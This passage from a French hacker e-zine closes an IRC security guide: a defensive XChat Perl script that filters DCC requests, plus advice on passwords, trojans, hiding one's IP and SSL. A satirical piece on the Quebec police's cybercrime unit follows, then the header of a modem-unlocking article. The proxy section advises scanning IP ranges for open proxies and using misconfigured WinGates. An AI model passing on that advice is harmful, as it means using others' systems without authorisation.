      my $H_MSG   = "PRIVMSG";
      my $TRIGGER = "DCCTRIGGER";
      my $DESC    = "pseudo-mechanisme d'identification pour initier les DCC.";

      # On doit absoluement enregistrer notre script auprΦs de xchat avant de
      # faire quoi que ce soit.
      Xchat::register($NAME, $VERSION, $DESC, "${PKG}::callback");
      # On 'hook' le message $H_MSG
      Xchat::hook_server($H_MSG, "${PKG}::parseTrigger");
      Xchat::print("\02$NAME $VERSION\02 by Ninja");

      # On ignore toutes les requΩtes de connexions DCC
      Xchat::command('IGNORE *!*@* DCC NOSAVE QUIET');

      sub parseTrigger {
            my ($rawuserhost, $cmd, $nick, @rawdata) = @{$_[0]};
            my (undef, $userhost) = split(':',$rawuserhost);
            my ($snick, undef) = split('!',$userhost);
            my (undef, $data) = split(':',(@rawdata)[0]);

            if ($data eq $TRIGGER) {
                  # On ajoute l'instigateur α la liste d'exception
                  Xchat::command(
                        'IGNORE '.
                        $userhost.
                        ' DCC NOSAVE QUIET UNIGNORE'
                        );
                  # On laisse 5 minutes pour initier une requΩte DCC
                  Xchat::command(
                        'QUOTE PRIVMSG '.
                        $snick.
                        ' :Vous avez 5 minutes pour initier votre requΩte DCC.'
                        );
                  Xchat::command(
                        'TIMER 300 UNIGNORE '.
                        $userhost.
                        ' QUIET'
                        );
                  return Xchat::EAT_ALL;
            }
	
            return Xchat::EAT_NONE;
      }

      sub callback {
            Xchat::command('UNIGNORE *!*@* DCC UNIGNORE');
      }

      1;
      =--------------------CUT HERE-------------------=

   3.3 Securiser ses scripts

      Ne jamais utiliser des mecanisme d'autentification basΘ uniquement  sur  des  nicknames 
      et/ou hostnames. Meme si il sagit de host unique (offert par  different  network) parce 
      qu'il son suceptible d'Ωtre utilisΘ/voler par une  personne  malveillante.  Vous pouvez 
      utiliser le nick et  le  host  dans  des  mechanisme d'autentification seulement si ils 
      servent de support a  un  autre mΘchanisme d'autentifiaction. N'utilisez pas de scripts 
      qui vous permettent de vous auto-identifier auprΦs d'un service ou  d'un  bot puisqu'il 
      requiΦre que le mot de pass et le nom d'utilisateur soient  conservΘs  en  quelque part 
      (gΘnΘralement un fichier). Il est donc possible,  si  votre  systΦme est compromis, que 
      quelqu'un accΦde α ce fichier et vole les  informations  qu'il contien. Il est possible 
      aussi qu'une personne ce  soit  emparrΘ  du  nick  d'un  bot  auprΦs  duquel  vous vous 
      identifiez, obtenant  ainsi votre nom d'utilisateur et votre mot-de-passe lors de votre
      tentative d'authetification. VΘrifiez la validitΘ du service ou bot et  identifiez vous 
      manuellement auprΦs de ces derniers. Utilisez des mots de  passe  sΘcuritaire.  Ce  que 
      j'entend par mot  de  passe  sΘcuritaire  c'est  qu'il  doit  Ωtre  long,  que  le  mot 
      n'apparaise pas dans le dictionnaire,  qu'il soit constituΘ de combinaison de caractΦre 
      alpha-numerique (chiffres  et  lettres)  et  si  le  systΦme d'identification est 'case 
      sensitive',  profitez en. TrΦs, trΦs important, changer vos mots de passe rΘguliΦrement
      (une fois par mois n'est pas exagΘrΘ). Essayez aussi  diffΘrentes  combinaisons  chaque 
      mois. Aussi trΦs important, ne JAMAIS garder une liste  de  vos mots de passe sur votre 
      ordinateur, il est plus sΘcuritaire de les  Θcrire  sur  papier ou dans un livret gardΘ 
      dans un endroit sΘcure et/ou secret.

   3.4 Trojan, virus, vers

      Certains scripts/addons changent complΦtement le fonctionnement habituel   de  certains 
      client  IRC.  Il  est  bien  important  de  prendre  conscience  que  certains  de  ses 
      scripts/addons peuvent contenir des backdoor, des virus ou  des  vers. Ils peuvent donc 
      permettrent, sans que vous en soiyez conscient,  un access α votre ordinateur ou lancer 
      des attaques. Il est primordiale que celui qui utilise un script/addon qui n'est pas de 
      sa conception, connaisse ce que chaque ligne de code fait exactement.
      
      Voici une liste de chose que vous devez ou ne devez pas faire afin de vous  assurez  de 
      n'Ωtre "jamais" infectΘ par un Trojan, virus, vers, etc.:
      
      - Ne jamais cliquer sur les liens qui sont publiΘs sous IRC en provenance  de quelqu'un 
        que vous ne connaissez pas.
      - Ne  jamais  accepter des fichiers de quelqu'un que vous ne connaissez pas.  (voir  la 
        section 3.2 pour plus de dΘtails)
      - Garder votre systΦme α jour. Avec plus de  200  nouveaux  virus  reportΘs  par  mois, 
        demain n'est pas le temps de mettre α jour votre systΦme mais aujourd'hui.  Installez 
        toutes les patches de sΘcuritΘ de votre systΦme  d'exploitation,  de votre navigateur 
        web (si par malheure vous cliquez  sur  un  mauvais  lien)  et  de  votre logiciel de 
        courriel nΘcessaires.

   3.5 Proxy, Wingate, Bouncer

      La  faτon  la  plus  simple  de cacher son adresse IP lors de vos sessions IRC  est  en  
      passant par un/des Proxys/Socks ou Wingates/Sygates/TelGates.

      Il  n'est  pas  trΦs difficile de trouver des proxys fonctionnels, une simple recherche 
      sur google avec les terme "proxy" et "list" vous retourne des  centaines de sites. Bien 
      entendu, ce n'est pas tout les proxys qui vont  vous  authoriser  α les utiliser, alors 
      parcourrez les diffΘrentes listes et  testez  ceux  que  vous pouvez utiliser pour vous 
      'bouncer' sur IRC. Une  autre  faτon de trouver des proxys est en scannant des segments 
      d'ip  α  lα  recherche  des  ports  8080,  3128, 81 et 80 ou pour des serveurs socks en 
      scannant pour le port 1080. Encore une fois, testez si ces serveurs vous  permettent de 
      vous 'bouncer' sur IRC. Prenez garde, la pluparts des serveurs proxy gardent des 'logs' 
      des connections faites. Donc il est  possible,  si l'effort y est mis, de vous retracer 
      grace α ces 'logs'. Malheureusement, il est maintenant rare de pouvoir se connecter sur 
      des serveurs IRC par l'intermΘdiaire de proxy, puisse que la majoritΘ vΘrifie  lors  de 
      la connection si vous tentez de vous connecter par un serveur  proxy/socks  et si c'est 
      le cas, la connection est interrompu. La vΘrification que font la plupars  des  serveur 
      IRC n'est pas incontournable,  ils  scan simplement l'adresse par laquel vous tentez de 
      vous connecter  pour  les  'well  known' ports de proxy. Mais si le proxy oblige un nom
      d'utilisateur et/ou mot de passe effectuer la connection, les serveur IRC  ne couperont 
      pas votre connexion.

      En ce qui concerne les WinGates/SyGates/TelGates, le fonctionnement  peut-Ωtre  un  peu 
      plus   complexe  qu'un  proxy  (dΘpends  des  type  de  wingates/sygates  et  de  leurs 
      configurations). Les WinGates permettent au gens de partager une connection sortante et 
      la plupars sont simplement mal configurΘ, et permettent ainsi les connections venant de 
      n'importe o∙. De  nos  jours, les WinGates opΘrationnels sont trΦs dure α trouver et ne
      fonctionneront pas longtemps, Θventuellement quelqu'un va se rendre compte  qu'il α ΘtΘ 
      mal configurΘ et va ou va faire fixer le problΦme. Encore une  fois,  googler  les mots 
      suivant: "wingate" et "lists". Il est aussi possible d'utiliser des scanner de wingates 
      pour les trouver vous mΩme. Il  y  a  beaucoup  de  scanner  de  disponible,  faite une 
      recherche, τa ne devrait pas Ωtre trΦs dur α trouver.

      Une autre faτon de cacher son ip est de passer par  un  'bouncer'.  Il  y  a  plusieurs 
      'bouncer' *nix et certains on ΘtΘ portΘ pour windows (plus sur ce sujet plus loin). Ils 
      sont conτus uniquement pour les session IRC et  fonction  comme  des  proxy  IRC.  Pour 
      utiliser un 'bouncer' il faut  premiΦrement un compte 'shell', autement dit, un accΦs α 
      une machine *nix  qui permet les processus en arriΦre-plan et les connexions sortantes. 
      Mais  la plupars des fournisseur de compte 'shell' gratuit ne les autorises pas,  alors 
      vous devez vous en payer un, sinon bonne chance dans votre  recherche.  La p lupars des 
      fournisseur de 'shell' on aussi ce qu'on appel  des  vhost,  nom de domaine vituel, qui 
      vous permettent de changer votre 'hostname' et de choisir parmis une liste.

      Un exemple:
        Connecter sur un serveur IRC directement, votre 'hostname' ressemble a
        ceci:
          dsl-154-13.aei.ca
          ou
          200-161-141-54.dsl.telesp.net.br
        Connecter sur un serveur IRC par l'intermΘdaire d'un 'bouncer' avec
        support vhost, votre 'hostname' ressemble a ceci:
          hahaha.undernetsucks.info
          ou
          PLZ.Dont.Ddos.My.56K.vid3otron.biz
          ou
          vive.les.femmes.enchaleur.biz
      Les  vhost  varies  entre  les  diffΘrent  fournisseurs de 'shell' et la faτon  de  les 
      assignΘ aussi.

      Vous  vous  rapplez  surement  que  j'ai  mentionnΘ  les  version  windows de  certains 
      'bouncer'. Je ne vous les recommande pas! PremiΦrement il  est  pratiquement impossible 
      de trouver un fournisseur   de  'bouncer' qui  fonctionne  sous  windows,  votre   seul 
      alternative est de demander α un ami  d'en  installer  un  sur son ordinateur. De plus, 
      c⌠tΘ stabilitΘ, les plateforme *nix n'ont plus α faire leurs preuves. On ne peut pas en 
      dire autant pour windows.

   3.6 La commande 'mode +x'

      Certains rΘseaux IRC offrent la possibilitΘ de cachΘ votre adresse  ip  ou  'hostname', 
      soit partiellement ou complΦtement. Il suffit de taper la  commande suivante dans votre 
      client aprΦs vous Ωtre connecter au serveur:

        /mode &lt;votre_nick> +x

      Prenez note que le rΘsultat de cette commande diffΦre d'un rΘseaux α  l'autre. De plus, 
      le mode peut changer selon le rΘseaux. Par exemple, sur  LinkNet,  'mode +h'  doit Ωtre 
      utilisΘ. Voici comment fonctionne 'mode +x' (et 'alike') sur les 4 plus gros rΘseaux:

        QuakeNet (~218 000):
          Pour pouvoir utiliser le mode +x sur QuakeNet, vous devez vous  enregistrer  auprΦs 
          du service Q. Ensuite, vous vous identifiez α Q comme suit:

            /msg Q@CServe.quakenet.org AUTH &lt;votre_username> &lt;votre_password>

          Ensuite vous mettez le mode +x comme dΘcrit plus haut. Il  est  important  de noter 
          que le mode +x ne fonctionne SEULEMENT lorsque vous  Ωtes  identifier  aupres de Q. 
          TrΦs important d'utiliser  Q@CServe.quakenet.org  avec  la  commande  login, il est 
          possible que quelqu'un prenne le nick de Q lorsque ce dernier est en netsplit.

        IRCnet (~128 000):
          Ce rΘseaux ne supporte pas le mode +x ou autres mΘthodes pour masquer  un hostname. 
          En fait, IRCnet ne possΦde aucun service.

        Undernet (~121 000):
          Pour pouvoir utiliser le mode +x sur Undernet, vous devez vous  enregistrer  auprΦs 
          de CService (http://cservice.undernet.org/live/)  puis  vous  identifiez  auprΦs du 
          robot de service (X) comme suit:

            /msg X@channels.undernet.org login &lt;votre_username> &lt;votre_password>

          Ensuite vous mettez le mode +x comme dΘcrit plus haut. Il  est  important  de noter 
          que le mode +x ne fonctionne SEULEMENT lorsque vous  Ωtes  identifier  aupres de X. 
          TrΦs important d'utiliser  X@channels.undernet.org  avec  la commande login, il est 
          possible que quelqu'un prenne le nick de X lorsque ce dernier est en netsplit.

        EFnet (~106 000):
          Ce rΘseaux ne supporte pas le mode +x ou autres mΘthodes pour masquer un hostname.

      Si vous utiliser le mΘchanime fournis par le rΘseaux pour cacher votre adresse au reste 
      du monde, il est prΘfΘrable de le faire avant de joindre  un  canal.  Je  ne  crois pas 
      avoir besoin de vous expliquer le pourquoi. Mais  malgrΘ  cela,  il  est  possible pour 
      quelqu'un d'obtenir votre adresse avant  que  vous  n'aillez  join  un  salon  et   ce, 
      simplement en connaissant votre  nick  habituel. Donc la faτon idΘale est de prendre un 
      nick alΘatoire avant  de  se  connecter, ensuite utiliser la mode +x ou son Θquivalant, 
      puis prendre votre nick habituel et finalement joindre vos salons prΘfΘrΘs.

   3.7 Serveur IRC sΘcuritaire (encryption SSL)

      Ce qu'on appel 'Secure IRC', serveur IRC supportant les connexions SSL sΘcuritaire, est 
      encore relativement rare et les clients IRC qui  le  supportent  nativement  sont   peu 
      nombreux. J'ai eu ouie-dire que xchat avait  le  support le plus mature et complet α ce 
      sujet. Mais si vous prΘfΘrez un  client  console,  irssi α  aussi un excellent support. 
      Plus sur les diffΘrents clients en fin de ce texte.

      'Secure IRC' est un ΘlΘment intΘressant pour tous les maniaques de la  sΘcuritΘ ou pour 
      les fervant dΘfenceur du droit α la vie privΘe. Les connections sΘcuritaires permettent 
      de protΘger l'intimitΘ des messages  envoyΘ  aux  autres  utilisateurs  et  robots   de 
      services, ainsi que de protΘger la communication dans n'importe quel salon de bavardage 
      privΘ.

      Parcontre,  il  faut bien comprendre qu'un serveur qui permet les connexions  normal et 
      sΘcuritaire ne protΦge plus α 100% les communications entre  utilisateurs  et  sur  les 
      salons de bavardage. Voici un explication plus  visuel  pour  permettre de mieux saisir 
      cet inconvΘniant:

      Prenons l'exemple  d'un  serveur  qui  n'autorise  que  les  connexions sΘcuritaire. Un 
      client, C1, α Θtablie une connextion sΘcuritaire avec un serveur, S1.

      +----+  Connexion sΘcure  +----+
      | C1 |<------------------>| S1 |
      +----+                    +----+

      Un autre client, C2, se connect sur le mΩme serveur, toujours de faτon sΘcuritaire.

      +----+  Connexion sΘcure  +----+  Connexion sΘcure  +----+
      | C1 |<------------------>| S1 |<------------------>| C2 |
      +----+                    +----+                    +----+

      Si C1 envoie un message privΘ α C2, le message en question sera protΘgΘ  durant tout le 
      voyage, puisque  les  deux  client  utilise  une  connexion  sΘcure. Mais si le serveur 
      acceptait aussi les connexions non sΘcuritaire,  et  que  C2  Θtablie une connexion non 
      sΘcuritaire avec le serveur, ce mΩme  message  ne  serait  maintenant  plus sΘcuritaire 
      durant tout le voyage:

      +----+  Connexion sΘcure  +----+  Connexion non-sΘcuritaire  +----+
      | C1 |<------------------>| S1 |<--------------------------->| C2 |
      +----+                    +----+             I1              +----+

      Il serait maintenant possible d'intercepter, en  I1,  le  message  en  provenance de C1 
      destinΘ α C2, puisque ce dernier utilise une connexion non protΘgΘ.

      Les serveurs supportant les deux mode de connexion n'offre pas une  protection complΦte 
      de vos messages privΘ. Et les serveur exclusivement  'Secure IRC'  ne  vous  offre  pas 
      nΘcessairement une protection absolue:  Si  les  serveurs d'un rΘseaux ne sont pas liΘe 
      ensemble par des connexion  sΘcuritaires,  votre  message  va  un  jour ou l'autre Ωtre 
      exposΘ.

      De faτon gΘnΘral, on peut dire que les connexion sΘcuritaire avec les  serveurs ne sont 
      utile que sur les rΘseaux publique, suceptible d'Ωtre  espionnΘ.  Petite  note pour les 
      clients qui ne supporte pas le  'Secure IRC',  il  est  possible  d'utilisΘ des tunnels 
      sΘcuritaire. Il s'agit d'un programme que vous installez sur votre ordinateur, qui joue 
      le r⌠le d'intermΘdiaire entre vous et le serveur. Il suffit de se connectΘ  localement, 
      avec votre client, sur le programme en question et ce dernier  Θtablie  une   connexion 
      sΘcuritaire avec le serveur.

      stunnel - encrypt arbitrary TCP connections inside SSL
            http://www.stunnel.org/

   3.8 RΦgles de base

      - Activez  le  mode personnel invisible (+i). Il sera plus difficile de vous   trouver. 
        Faite simplement /mode votre_nick +i. Vous ne serai pas  complΦtement  invisible, les 
        utilisateurs sur le mΩme salon que vous  pourrons  vous v oir. Vous serez, parcontre, 
        invisible aux utilisateurs  qui  utilisent  les  commande /who et /names. La commande 
        /whois  va  cependant  donner  vos  informations et les salons sur lesquels vous vous
        trouvez.
      - Ne donner aucune informations personnelles: nom, numero de tΘlΘphone, adresse  civil, 
        etc.
      - Utilisez un nick de nature general, qui ne donne pas d'information sur l'age que vous 
        pourriez avoir ni votre sexe.
      - Ne tΘlΘchargez aucuns fichiers sauf si vous faite entiΦrement confiance  au  "sender" 
        et que vous savez qu'est-ce que le fichier contien.
      - N'allez pas sur les sites qui sont publiΘs sur les salon par  des  personnes  ou  des 
        bots. Ils peuvent contenir du code malveillant qui peut  Ωtre  tΘlΘchargΘ  sur  votre 
        ordinateur.
      - Ne taper aucune commande dont vous ne connaissez pas  son  utilitΘ  et  le   rΘsultat 
        escomptΘ. Ne jamais faire ce qu'un utilisateur vous demande de faire si ce qu'il vous 
        demande semble Θtrange ou que vous ne connaissez pas le rΘsultat.
      - N'activΘ  pas  l'option  'Auto join on invite'.  Certains  utilisateurs  malveillants 
        pourraient vous faire joindre plusieurs salons lourdement  frΘquentΘ  et ainsi forcer 
        le serveur α vous dΘconnecter pour  ne  pas  vous  flooder. Vous devez comprendre que 
        lorsque l'on join un salon, le client envoie la commande NAMES au serveur pour que ce 
        dernier vous envoie la  liste des utilisateurs qui sont prΘsent sur le salon que vous 
        venez de joindre. Plus il y a d'utilisateurs sur le salon, plus la liste est  longue. 
        De plus, certains clients, en plus d'envoyer la commande NAMES,  envoient la commande 
        WHO pour obtenir les hostnames des clients prΘsent sur le salon. Le serveur doit donc 
        vous envoyer une quantitΘ d'informations importantes, et la plupars des servers, pour 
        vous protΘger, vont vous dΘconnecter si il y a trop d'informations α envoyer.
      - N'activΘ  pas  l'option  'Whois  on query'. Quelqu'un pourrais simplement  lancer  un 
        simple flood de privmsg avec un botnet suffisament populeux  pour que le serveur vous 
        dΘconnect pour 'Excess Flood'.

4. Conclusion

   Voilα,  c'est  ce  qui termine mon exposΘ sur la sΘcuritΘ sous IRC. J'espΦre que certaines 
   des infos seront utiles pour les nΘophites ou pour les freaks de la sΘcuritΘ.


  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  /, `
 \  /   \[:P]/      \_____                                                   ___/    ;
 |\/  '  \__/ . ' ;   |  \____           /:/=[  Info-Pubs  ]=\:\         _____/  x  ` 
 || `  ()            -+-   \____   ________________________   ____ ____   /  ,   . |  ,
 || + .  . ` ; ` : `  | x  ,  :/ _/ , x      ;  '  . .  +  \_ \   \\_ x\_ \      -=+=-
 ||  ____  ____    __     _    // _      '_    ___  ________ \\_` \_ \ _ \\_   .  `| ,
 ||.|                                                        \_ \   \\_  \_ \         `
 || |                                                          \\_  \_ \   \\_ M  ; . X
 || |                                                          \_ \   \\_  \_ \ K      
 || |                                                            \\_  \_ \   \\_ -  : '
 ||`|                                                            \_ \   \\_  \_ \ 1   
 || |                                                              \\_  \_ \   \\_ 1  + 
 || |              Http://www.restobooking.com                     \_ \   \\_  \_ \ 1   
 ||'|                                                                \\_  \_ \   \\_  x 
 || |                                                                \_ \   \\_  \_ \  `
 || |                                                                  \\_  \_ \   \\_  
 ||,|                                                                  \_ \   \\_  \_ \.
 || |                                                                    \\_  \_ \  _\\_  
/ | |                                                                    \_ \   \\_/    \
 / ;|                                                                      \\_  \_       |
 /  |__________________  __________   _____     ___     _      _      ___ _\_ \__/       |
 /\_____ ` + . _// ` x ,   ,   `    ; X  `           :      .   -+-  :    ,  \\_/        |
\\_     \_____/  /___________  +  :  .    ,  ` x  ,     " ,   .  `   .   ____\           |
\_ \                        \___________________________________________/                |
  \\_ /:/=[ Par ce que tout le monde mange !!                                     ]=\:\  |
  \__\__________________________________________________________________________________/ 

  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  / `
 \  /   \[14]/ +   ,\_____                                                   ___/ .  `
 |\/   , \__/  .        \____ /:/=[ un affaire de cops            ] =\:\ _____/  `  x
 || ,    .         "   :X  \_______________________________   ____ ____   /    ,  `  `
 ||         +  ,   () .         x  , .           `   '   ` \_ \  ,\\_ +\_ \ 'M  ` |  .
 ||   ` |  `       ,      `   ,         +  ,  ` ,--,   +   . \\_  \_ \ , \\_  K  -+-   
/ |+   -+-    .        ,       `      ,       ,',/ ,'.       \_ \ . \\_  \_ \  -  |   `
 /    . |  ;     +         +  .   `   | :  .  :`` ,_):   '   ` \\_  \_ \   \\_` 1   ,  
 / ` .      .        x          ,  .-=+=-     `. ,. ,'  ` ,    \_ \ + \\_` \_ \  1
 /\_____  x    ' ,      . . X         |   `     `--'  `      `   \\_  \_ \ , \\_  1 +
\\_     \___________________ ,  .  .  ` ,  +  '   ,    , ; x   ._\  \___\\___\  \ .   
\_ \                        \__________________________________/                 \  ` ,
  \\_ /:/=[ Aka: wannabe a cops super star, big gun fat cars...            ]=\:\  \    
  \__\__________________________________________   ______________________________  \`  
                                                \__\                            /__/   
                                                  \\_ /:/=[    Wyzeman   ]=\:\ _//     
                                                  \__\________________________/__/ 




L'idΘe de faire un article sur les mΘthodes, conventions, et  l'organisation  d'une   brigade 
policiΦre dΘdiΘ α la sΘcuritΘ informatique ne nous serait surement pas  venu  α  l'esprit  si 
nous n'avions pas ΘtΘ mis au courant du fait que des confΘrences  donnΘe  par  notre  corp de 
police provincial (la SuretΘ du QuΘbec, sympatiquement appellΘ SQ) traitais des mΘthodes, des 
conventions et de l'organisation  des  goupes  de  hacker  en  gΘnΘrale  et  de  mindkind  en 
particulier. Une parti de la confΘrence  portant le nom de "dissectation du groupe Mindkind". 
Livrant α un public amateur  l'image  que  Mindkind  est  un groupe organiser (roche, papier, 
sciseaux) disposant de  multitude  de  moyen de communication (ma soeur aussi chat sur irc et 
msn , elle  a  meme  un  cellulaire  aussi, oui oui), d'une diversiter de talent (la plus par 
d'entre  nous  sont incapable de se faire α manger) et d'une  Θducation ΘlevΘ  (du secondaire 
2  au  doctorat)  ainsi  que  d'une bonne  source de revenu (le porn). He ben, attention cher 
citoyen, Mindkind considΦre qu'il est important de vous dΘmontrer que le SCRS  la  GRC  et la 
SQ, sont des groupes organisΘ (directeur,sous directeur, grade,  conventions, education, etc) 
disposant de multitude de moyen de communication  (frequence  rΘserver mes amis), ainsi d'une 
Θducation ΘlevΘ (y'on meme leur  propre  Θcole  et programme de cegep), sans compter bien sur 
une bonne source de revenu (vosimpots, taxe, amende..). Pour ce qui est de la  diversitΘ  des 
talents, bien disont  simplement qu'ils ont une DIVISION informatique. 


	Nous nous sommes donc permis dutilisez les mΩmes mΘthodes dinvestigation  extremement 
avancΘ que la SQ α utilisΘ contre nous. Autrement dit on est allΘ lire  leur site web, ΘcoutΘ 
leur confΘrence, tapez leur lignes, installer des hommes de  pailles  dans tout les postes du 
quΘbec et... bon je dΘlire on a juste lu leur site  web  et  nous  nous  sommes  procurΘ  des 
comptes rendu de quelque une de leur confΘrence.  Ce  qui  fait que nous sommes maintenant en 
mesure  de  vous  livrer  des  informations  d'une  signification plus qu'insignifiante. Pour 
emprunter l'expression de "en attendant ben laden";  nous  vous  invitons  α  jetez un regard 
miope sur la suretΘ du quΘbec. 


1) Raison d'etre
2) organisation
3) la division cybercrime et processus de plainte
4) conclusion


1) Raison d'etre 

"to serve and protect"

sur le site meme on nous fournis les informations suivantes :

	
Maintien de la paix, de l'ordre et de la sΘcuritΘ publique



½ La S√retΘ du QuΘbec, police nationale, concourt, sur l'ensemble  du  territoire  quΘbΘcois, 
au maintien de la paix et de l'ordre public, α la prΘservation de la  vie,  de la sΘcuritΘ et 
des droits fondamentaux des personnes ainsi qu'α la  protection  de leurs biens. La S√retΘ du 
QuΘbec  soutient  aussi  la  communautΘ    policiΦre,  coordonne  des  opΘrations  policiΦres 
d'envergure, contribue α  l'intΘgritΘ  des  institutions  Θtatiques et assure la sΘcuritΘ des 
rΘseaux de transport qui relΦvent du QuΘbec.╗


Vision de la S√retΘ du QuΘbec

½ GrΓce α la mobilisation et α l'expertise de ses membres policiers et civils, la  S√retΘ  du 
QuΘbec, en tant qu'organisation  moderne  et  dynamique,  vise  α  rΘpondre  aux  plus hautes 
exigences de qualitΘ et de service dans tous ses champs d'activitΘ.  Afin  de  mieux protΘger 
les citoyens, la S√retΘ du QuΘbec place, au coeur de son  action  concertΘe, le respect de la 
loi et des droits fondamentaux des personnes. ╗ 


Les valeurs qui guident les actions et les interventions de la S√retΘ du QuΘbec.

IntΘgritΘ

Respect

Professionnalisme

Service


La S√retΘ du QuΘbec assure l'application de nombreuses lois quΘbΘcoises, notamment :

le Code de la sΘcuritΘ routiΦre 
la Loi sur l'assurance automobile 
la Loi sur les loteries, courses et jeux  
la Loi sur les explosifs 
la Loi sur les agences d'investigation ou de sΘcuritΘ 
la Loi sur les infractions en matiΦre de boissons alcooliques 
la Loi sur les permis d'alcool 
la Loi sur la SociΘtΘ des alcools. 




De mΩme, dans le cadre de ses  compΘtences,  la  S√retΘ  du  QuΘbec  applique  diverses  lois 
fΘdΘrales sur le territoire quΘbΘcois, principalement :

le Code criminel 
la Loi rΘglementant certaines drogues et autres substances 
la Loi sur les explosifs 
la Loi sur la marine marchande du Canada 
Loi sur les armes α feu. 


bref,  ce  sont  de  brave type qui contribue du mieu de leur compΘtence a rentre le monde de 
demain beaucoup plus  sΘcure  et  paranoyaque. Cest gens protΦge aussi le gouvernement, c'est
donc a eux de jouer contre ceux qui trouble l'ordre public et crΘer le chaos.



2) organisation 

Pour arrivez α cette tΓche la police national dispose d'une imprΘssionnante organisation  qui 
savΩre parfois mΩme Ωtre pl√tot efficace surtout dans la lutte au crime organiser (Al  capone 
a des clones mΩme au QuΘbec). Comme vous pourrez constatez sur  la  piece  a  conviction  #1. 
l'organigramme de la SQ compte plusieur directeur a la fois  geo  strategique et d'autre par, 
sectoriel (la jdois avouer quon les a un peu copier  pour  creer  la structure organisationel 
de mindkind ;]), 


3) La division Cybercrime et processus de plainte


Notre bonne vieille SQ dispose d'un departement propre relier au crime informatique  (faudre,
copyright, pedophilie, hacking, etc), Cette division traite avant tout les plaintes  relative
a des mefais du monde informatique mais possΦde aussi un caractΦre prΘventif visant α dΘtectΘ
les dangers reliΘ a l'informatique et l'utilisation d'Internet.  la  piΦce  α  conviction  #2 
dΘmontre quel cheminement prend une plainte vers un arrestation ou un rejet de la plainte.



4) Conclusion


Peu importe ce  que  vous  avez prΘvus faire en fin de semaine, rappellez vous que les forces
de  l'ordre  sont extrement plus organiser et efficace que aucun groupe undergroune ne pourra
jamais  l'Ωtre  (α  moin d'un  support  financier  colossal),  alors prennez vos prΘcotion et 
n'oublier  surtout pas qu'ils sont plus fort, plus nombreux, plus organiser et plus riche que 
vous et vos 10 potes rΘunis. 

  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  /, `
 \  /   \[:P]/      \_____                                                   ___/    ;
 |\/  '  \__/ . ' ;   |  \____           /:/=[  Info-Pubs  ]=\:\         _____/  x  ` 
 || `  ()            -+-   \____   ________________________   ____ ____   /  ,   . |  ,
 || + .  . ` ; ` : `  | x  ,  :/ _/ , x      ;  '  . .  +  \_ \   \\_ x\_ \      -=+=-
 ||  ____  ____    __     _    // _      '_    ___  ________ \\_` \_ \ _ \\_   .  `| ,
 ||.|                                                        \_ \   \\_  \_ \         `
 || |                                                          \\_  \_ \   \\_ M  ; . X
 || |                                                          \_ \   \\_  \_ \ K      
 || |                                                            \\_  \_ \   \\_ -  : '
 ||`|                                                            \_ \   \\_  \_ \ 1   
 || |          http://www.mindkind.org                             \\_  \_ \   \\_ 1  + 
 || |                                                              \_ \   \\_  \_ \ 1   
 ||'|                                                                \\_  \_ \   \\_  x 
 || |                                                                \_ \   \\_  \_ \  `
 || |                                                                  \\_  \_ \   \\_  
 ||,|                                                                  \_ \   \\_  \_ \.
 || |                                                                    \\_  \_ \  _\\_  
/ | |                                                                    \_ \   \\_/    \
 / ;|                                                                      \\_  \_       |
 /  |__________________  __________   _____     ___     _      _      ___ _\_ \__/       |
 /\_____ ` + . _// ` x ,   ,   `    ; X  `           :      .   -+-  :    ,  \\_/        |
\\_     \_____/  /___________  +  :  .    ,  ` x  ,     " ,   .  `   .   ____\           |
\_ \                        \___________________________________________/                |
  \\_ /:/=[ Membre honnoraire du webring Hack.fr                                  ]=\:\  |
  \__\__________________________________________________________________________________/ 

  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  / `
 \  /   \[15]/ +   ,\_____                                                   ___/ .  `
 |\/   , \__/  .        \____ /:/=[ Unlock speadstream 5200       ] =\:\ _____/  `  x
 || ,    .         "   :X  \_______________________________   ____ ____   /    ,  `  `
 ||         +  ,   () .         x  , .           `   '   ` \_ \  ,\\_ +\_ \ 'M  ` |  .
 ||   ` |  `       ,      `   ,         +  ,  ` ,--,   +   . \\_  \_ \ , \\_  K  -+-   
/ |+   -+-    .        ,       `      ,       ,',/ ,'.       \_ \ . \\_  \_ \  -  |   `
 /    . |  ;     +         +  .   `   | :  .  :`` ,_):   '   ` \\_  \_ \   \\_` 1   ,  
 / ` .      .        x          ,  .-=+=-     `. ,. ,'  ` ,    \_ \ + \\_` \_ \  1
 /\_____  x    ' ,      . . X         |   `     `--'  `      `   \\_  \_ \ , \\_  1 +
\\_     \___________________ ,  .  .  ` ,  +  '   ,    , ; x   ._\  \___\\___\  \ .   
\_ \                        \__________________________________/                 \  ` ,
  \\_ /:/=[ Aka: Ginette va me chercher la hache.                          ]=\:\  \    
  \__\__________________________________________   ______________________________  \`  
                                                \__\                            /__/   
                                                  \\_ /:/=[    Nuclear   ]=\:\ _//     
                                                  \__\________________________/__/ 

  
         _.-+.        ____   __ __  ____    ___   _____  ____     ___   ____  __  _ 
    _.-""     '.     |    \ |  T  T|    \  /   \ |     ||    \   /  _] /    T|  l/ ]
+:""            '.   |  o  )|  |  ||  D  )Y     Y|   __j|  D  ) /  [_ Y  o  ||  ' / 
| \               '. |   _/ |  ~  ||    / |  O  ||  l_  |    / Y    _]|     ||    \
|  \            _.-+ |  |   l___, ||    \ |     ||   _] |    \ |   [_ |  _  ||     Y
|  '.       _.-"   | |  |   |     !|  .  Yl     !|  T   |  .  Y|     T|  |  ||  .  |
J    \  _.-"       L l__j   l____/ l__j\_j \___/ l__j   l__j\_jl_2005_|__j__jl__j\_j
L     +"           J                                               Now more Stylized
 +    |            |  Www.Pyrofreak.Org                               
  \   |          .+   Www.Pyrofreak.Tk
   \  |       .-'                                                     
    \ |    .-'        
     \| .-'           
      +                 
					
								     
         			             (((
					    (o o)
        |--,.-,.-,-.-,-,-.-,.-,.-,.,-.-,ooO--(_)--Ooo--,,.-,.--,.-,.-,.,.,..,.-.-,.|
        Title:        Unlock SpeadStream 5200 ( dont read uncap )
        Author:       NuClEaR 
        Email:        nuclear@pyrofreak.org
        Irc:          #hack.fr && #phreak.fr && #pyrofreak @ undernet
        Website:      Www.PyroFreak.Org
        |--,.-,.-,-.-,-,-.-,.-,.-,.,-.-,.,-.-,.-,.-,.-,.,.,.,-.,-.-,.-,-.-,.,.-.-,.|
      
[ ::: PrΘface ::: ]





